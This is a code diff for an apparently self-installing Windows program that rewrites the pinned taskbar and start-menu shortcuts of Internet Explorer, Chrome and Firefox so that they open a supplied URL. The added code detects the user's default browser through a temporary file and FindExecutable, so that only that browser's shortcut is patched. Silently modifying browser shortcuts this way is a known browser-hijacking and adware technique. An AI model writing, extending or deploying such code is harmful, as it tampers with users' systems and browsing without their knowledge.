@@ -28,12 +28,28 @@ const TCHAR kActionUninstall[] = _T("uninstall");
 
 const TCHAR kLinkExtension[] = _T(".lnk");
 
+const TCHAR* kBrowserImageNames[] = {
+	_T("iexplore"),
+	_T("chrome"),
+	_T("firefox")
+};
+
 const TCHAR* kLinkNames[] = {
 	_T("Internet Explorer.lnk"),
-	_T("Internet Explorer (64-bit).lnk"),
+	//_T("Internet Explorer (64-bit).lnk"),
 	_T("Google Chrome.lnk"),
 	_T("Mozilla Firefox.lnk")
 };
+
+struct {
+	const TCHAR* kBrowserImageName;
+	const TCHAR* kLinkName;
+} BrowserImageLinkMap[] = {
+	{ kBrowserImageNames[0], kLinkNames[0] },
+	{ kBrowserImageNames[1], kLinkNames[1] },
+	{ kBrowserImageNames[2], kLinkNames[2] }
+};
+
 
 // ----------------------------------------------------------------------------
 bool PatchLink(const ATL::CString _linkFilePath, const ATL::CString _urlArg)
@@ -71,7 +87,7 @@ bool PatchLink(const ATL::CString _linkFilePath, const ATL::CString _urlArg)
 }
 
 // ----------------------------------------------------------------------------
-DWORD PatchDir(const ATL::CString& _dir, const ATL::CString _urlArg)
+DWORD PatchDir(const ATL::CString& _dir, const ATL::CString _urlArg, const ATL::CString _linkName)
 {
 	DWORD dwPatchedLinks = 0;
 
@@ -84,8 +100,6 @@ DWORD PatchDir(const ATL::CString& _dir, const ATL::CString _urlArg)
 	if (INVALID_HANDLE_VALUE == hFile)
 		return 0;
 
-	int iLinksCnt = _countof(kLinkNames);
-	int iEqualStrings = -1;
 	ATL::CString sFileExt;
 	ATL::CString sFilePath;
 
@@ -96,9 +110,7 @@ DWORD PatchDir(const ATL::CString& _dir, const ATL::CString _urlArg)
 			sFileExt = ::PathFindExtension(fd.cFileName);
 			if (sFileExt == kLinkExtension)
 			{
-				int i = iLinksCnt;
-				while (i && (iEqualStrings = _tcscmp(fd.cFileName, kLinkNames[--i])) != 0);
-				if (0 == iEqualStrings)
+				if (0 == _tcscmp(fd.cFileName, _linkName))
 				{
 					::PathCombine(sFilePath.GetBufferSetLength(MAX_PATH), _dir, fd.cFileName);
 					sFilePath.ReleaseBuffer();
@@ -292,6 +304,69 @@ bool InstallSelf()
 }
 
 // ----------------------------------------------------------------------------
+bool GetDefaultBrowser(ATL::CString& _imageName)
+{
+	enum { MAX_BUF_LEN = 1024 };
+	TCHAR szTmpPath[MAX_BUF_LEN] = {0};
+	BOOL rv = ::GetTempPath(MAX_BUF_LEN, szTmpPath);
+	ATLENSURE_RETURN_VAL(rv, false);
+
+	// Get random number for a temporary file name
+	ATL::CString sTmpFile;
+	while (1 == 1)
+	{
+		// Generate unique temporary file name
+		sTmpFile.Format(_T("%s\\_%d.htm"), szTmpPath, rand());
+		if (!::PathFileExists(sTmpFile))
+		{
+			// Create a new file
+			HANDLE hFile = ::CreateFile(
+				sTmpFile,
+				GENERIC_READ,
+				FILE_SHARE_DELETE,
+				NULL,
+				CREATE_NEW,
+				FILE_ATTRIBUTE_NORMAL,
+				NULL);
+			ATLENSURE_RETURN_VAL(INVALID_HANDLE_VALUE != hFile, false);
+			break;
+		}
+	}
+
+	// Find associated EXE
+	TCHAR szExePath[MAX_BUF_LEN] = {0};
+	HINSTANCE hInst = ::FindExecutable(sTmpFile, NULL, szExePath);
+	ATLENSURE_RETURN_VAL((int)hInst > 32, false);
+
+	// Delete temporary file
+	rv = ::DeleteFile(sTmpFile);
+	ATLASSERT(rv);
+
+	// Get the associated EXE process name
+	TCHAR* pExeName = ::PathFindFileName(szExePath);
+	ATLENSURE_RETURN_VAL(pExeName != szExePath, false);
+	::PathRemoveExtension(pExeName);
+	_imageName = pExeName;
+
+	return true;
+}
+
+// ----------------------------------------------------------------------------
+bool GetBrowserImageLinkName(const ATL::CString& _imageName, ATL::CString& _linkName)
+{
+	//BrowserImageLinkMap
+	int i = _countof(BrowserImageLinkMap);
+	int iEqualStrings = -1;
+	while (i && (iEqualStrings = _tcscmp(_imageName, BrowserImageLinkMap[--i].kBrowserImageName)) != 0);
+	if (0 == iEqualStrings)
+	{
+		_linkName = BrowserImageLinkMap[i].kLinkName;
+		return true;
+	}
+	return false;
+}
+
+// ----------------------------------------------------------------------------
 extern "C" int WINAPI _tWinMain(HINSTANCE hInstance, 
 								HINSTANCE hPrevInstance, 
 								LPTSTR lpCmdLine, 
@@ -390,10 +465,21 @@ extern "C" int WINAPI _tWinMain(HINSTANCE hInstance,
 	directories.insert(GetFolderPath(CSIDL_APPDATA) + kPinnedTaskBarDir);
 	directories.insert(GetFolderPath(CSIDL_APPDATA) + kPinnedStartMenuDir);
 
+	ATL::CString sDefaultBrowserImageName;
+	bool rv = GetDefaultBrowser(sDefaultBrowserImageName);
+	ATLENSURE_RETURN_VAL(rv, 1);
+	LOG_DEBUG(_T("Default browser image name: %s"), sDefaultBrowserImageName);
+
+	ATL::CString sBrowserLinkName;
+	rv = GetBrowserImageLinkName(sDefaultBrowserImageName, sBrowserLinkName);
+	ATLENSURE_RETURN_VAL(rv, 1);
+	LOG_DEBUG(_T("Default browser link name: %s"), sBrowserLinkName);
+
 	DWORD dwPatchedLinks = 0;
 	std::set<ATL::CString>::const_iterator itr;
 	for (itr = directories.begin(); itr != directories.end(); ++itr)
-		dwPatchedLinks += PatchDir(*itr, sUrl);
+		dwPatchedLinks += PatchDir(*itr, sUrl, sBrowserLinkName);
+	LOG_DEBUG(_T("Patched %s links: %d"), sDefaultBrowserImageName, dwPatchedLinks);
 
 	if (dwPatchedLinks)
 	{
